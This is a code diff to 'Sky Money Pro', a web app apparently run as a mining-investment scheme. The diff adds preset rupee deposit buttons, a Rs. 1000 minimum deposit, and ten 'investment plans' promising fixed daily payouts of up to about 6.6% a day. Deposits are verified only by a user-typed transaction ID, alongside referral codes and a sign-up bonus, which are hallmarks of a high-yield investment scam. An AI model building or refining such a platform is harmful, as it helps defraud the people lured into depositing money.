@@ -87,6 +87,11 @@
         .mining-status-card { background: var(--card-bg); border: 1px solid var(--border-color); border-radius: 18px; padding: 15px; margin-bottom: 15px; transition: background 0.3s; }
         .progress-container { background: var(--border-color); height: 6px; border-radius: 10px; margin: 12px 0; overflow: hidden; }
         .progress-bar { background: var(--secondary); height: 100%; border-radius: 10px; transition: 0.5s; }
+
+        /* Deposit Selection Grid */
+        .deposit-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin: 15px 0; }
+        .dep-btn { background: var(--card-bg); border: 1px solid var(--border-color); padding: 10px; border-radius: 10px; color: var(--primary); font-weight: 600; cursor: pointer; }
+        .dep-btn:hover { background: var(--secondary); color: white; }
     </style>
 </head>
 <body>
@@ -104,7 +109,7 @@
 <div id="auth-screen">
     <div style="text-align:center; padding: 20px; width: 100%;">
         <h1 style="font-family:'Poppins'; color: white; text-shadow: 0 4px 15px rgba(0,0,0,0.4); font-size: 32px;">Sky Money <span style="color:var(--accent);">Pro</span></h1>
-        <div style="background: rgba(255, 255, 255, 0.96); padding: 30px; border-radius: 28px; box-shadow: 0 20px 40px rgba(0,0,0,0.3); max-width: 400px; margin: 0 auto; backdrop-filter: blur(10px);">
+        <div style="background: rgba(255, 255, 255, 0.96); padding: 30px; border-radius: 28px; box-shadow: 0 20px 40px rgba(0,0,0,0.3); max-width: 400px; margin: 0 auto;">
             <div id="login-form">
                 <h3 style="margin-top:0; color: #0f172a;">Login</h3>
                 <input type="email" id="l-email" placeholder="Email Address">
@@ -136,7 +141,6 @@
             <div class="banner-wrapper">
                 <div class="banner-slide" style="background-image: url('https://img.freepik.com/free-vector/digital-money-transfer-technology-background_1017-17454.jpg');"></div>
                 <div class="banner-slide" style="background-image: url('https://img.freepik.com/free-vector/gradient-crypto-mining-concept_23-2148914624.jpg');"></div>
-                <div class="banner-slide" style="background-image: url('https://img.freepik.com/free-vector/stock-market-exchange-graph-report_53876-119106.jpg');"></div>
             </div>
         </div>
 
@@ -186,10 +190,19 @@
     <section id="deposit" class="page">
         <div style="padding:20px;">
             <h3>Deposit</h3>
-            <p style="font-size:12px; color:var(--text-muted);">Binance ID: 12345678</p>
-            <input type="number" id="d-amt" placeholder="Deposit Amount">
-            <input type="text" id="d-txid" placeholder="Transaction ID">
-            <button class="btn-action" onclick="submitReq('deposit')">Submit Deposit</button>
+            <p style="font-size:12px; color:var(--text-muted);">මුදල් තැන්පත් කිරීමට අවශ්‍ය මුදල තෝරන්න හෝ ඇතුළත් කරන්න.</p>
+            
+            <div class="deposit-grid">
+                <button class="dep-btn" onclick="setDepAmt(1000)">Rs. 1000</button>
+                <button class="dep-btn" onclick="setDepAmt(2000)">Rs. 2000</button>
+                <button class="dep-btn" onclick="setDepAmt(3000)">Rs. 3000</button>
+                <button class="dep-btn" onclick="setDepAmt(4000)">Rs. 4000</button>
+                <button class="dep-btn" onclick="setDepAmt(5000)">Rs. 5000</button>
+            </div>
+
+            <input type="number" id="d-amt" placeholder="Amount (Minimum Rs. 1000)">
+            <input type="text" id="d-txid" placeholder="Transaction ID / Slip Reference">
+            <button class="btn-action" onclick="submitReq('deposit')">Submit Deposit Request</button>
         </div>
     </section>
 
@@ -230,7 +243,8 @@
     const db = getFirestore(app);
     let userData = null;
 
-    // --- Authentication ---
+    window.setDepAmt = (amt) => { document.getElementById('d-amt').value = amt; };
+
     window.register = async () => {
         const email = document.getElementById('r-email').value;
         const pass = document.getElementById('r-pass').value;
@@ -256,7 +270,7 @@
             onSnapshot(doc(db, "users", user.uid), (snap) => {
                 if(snap.exists()) {
                     userData = snap.data();
-                    if(userData.isBanned) { alert("ඔබේ ගිණුම තාවකාලිකව අත්හිටුවා ඇත."); logout(); return; }
+                    if(userData.isBanned) { alert("Account Banned!"); logout(); return; }
                     document.getElementById('auth-screen').style.display = 'none';
                     document.getElementById('main-app').style.display = 'block';
                     updateUI();
@@ -266,7 +280,6 @@
         }
     });
 
-    // --- UI Update ---
     window.updateUI = () => {
         const now = Date.now();
         document.getElementById('bal-text').innerText = "Rs. " + userData.bal.toLocaleString();
@@ -274,7 +287,6 @@
         document.getElementById('u-email').innerText = userData.email;
         document.getElementById('u-ref-code').innerText = userData.refCode;
 
-        // Mining Display
         document.getElementById('mining-status-area').innerHTML = userData.activePlans.map(p => {
             const days = Math.floor((now - p.startTime) / 86400000);
             const progress = (Math.min(days, 30) / 30) * 100;
@@ -286,15 +298,25 @@
             </div>`;
         }).join('') || '<p style="font-size:12px; color:var(--text-muted);">No active plans.</p>';
 
-        // Market
-        const plans = [{ name: 'Starter', cost: 1000, daily: 70, color: '#f59e0b' }, { name: 'Bronze', cost: 2500, daily: 180, color: '#10b981' }, { name: 'Silver', cost: 5000, daily: 380, color: '#8b5cf6' }];
+        // Updated Investment Plans (Rs. 500 to Rs. 5000)
+        const plans = [
+            { name: 'Plan 1', cost: 500, daily: 10, color: '#f59e0b' },
+            { name: 'Plan 2', cost: 1000, daily: 25, color: '#10b981' },
+            { name: 'Plan 3', cost: 1500, daily: 45, color: '#8b5cf6' },
+            { name: 'Plan 4', cost: 2000, daily: 70, color: '#3b82f6' },
+            { name: 'Plan 5', cost: 2500, daily: 100, color: '#ec4899' },
+            { name: 'Plan 6', cost: 3000, daily: 135, color: '#6366f1' },
+            { name: 'Plan 7', cost: 3500, daily: 175, color: '#14b8a6' },
+            { name: 'Plan 8', cost: 4000, daily: 220, color: '#f43f5e' },
+            { name: 'Plan 9', cost: 4500, daily: 270, color: '#06b6d4' },
+            { name: 'Plan 10', cost: 5000, daily: 330, color: '#a855f7' }
+        ];
         document.getElementById('market-list').innerHTML = plans.map(p => `
             <div class="inv-card" style="border-left: 5px solid ${p.color}">
-                <div><b>${p.name}</b><br><small>Rs. ${p.cost}</small></div>
+                <div><b>${p.name}</b><br><small>Cost: Rs. ${p.cost}</small><br><small style="color:var(--success)">Daily: Rs. ${p.daily}</small></div>
                 <button onclick="buyPlan(${p.cost}, ${p.daily}, '${p.name}')" class="btn-action" style="width:auto; background:${p.color}">Invest</button>
             </div>`).join('');
 
-        // Transactions
         document.getElementById('trans-history').innerHTML = userData.requests.map(r => `
             <div class="trx-item">
                 <div><b>${r.type.toUpperCase()}</b><br><small>${new Date(r.time).toLocaleDateString()}</small></div>
@@ -304,11 +326,11 @@
         if(userData.bonusClaimed) document.getElementById('bonus-btn').style.opacity = "0.5";
     };
 
-    // --- Action Logic ---
     window.submitReq = async (type) => {
         const amt = parseInt(document.getElementById(type === 'deposit' ? 'd-amt' : 'w-amt').value);
         const details = document.getElementById(type === 'deposit' ? 'd-txid' : 'w-details').value;
         if(!amt || !details) return alert("Please fill all details.");
+        if(type === 'deposit' && amt < 1000) return alert("Minimum deposit is Rs. 1000.");
         if(type === 'withdraw' && userData.bal < amt) return alert("Insufficient balance.");
 
         let updateData = { requests: arrayUnion({ type, amount: amt, status: 'pending', payID: details, time: Date.now() }) };
@@ -332,7 +354,6 @@
         alert("Rs. 200 Bonus Claimed!");
     };
 
-    // --- Helpers ---
     window.showPopup = () => { document.getElementById('tg-popup').style.display = 'flex'; setTimeout(() => document.getElementById('close-btn').style.display='block', 5000); };
     window.closePopup = () => document.getElementById('tg-popup').style.display = 'none';
     window.nav = (id, el) => {
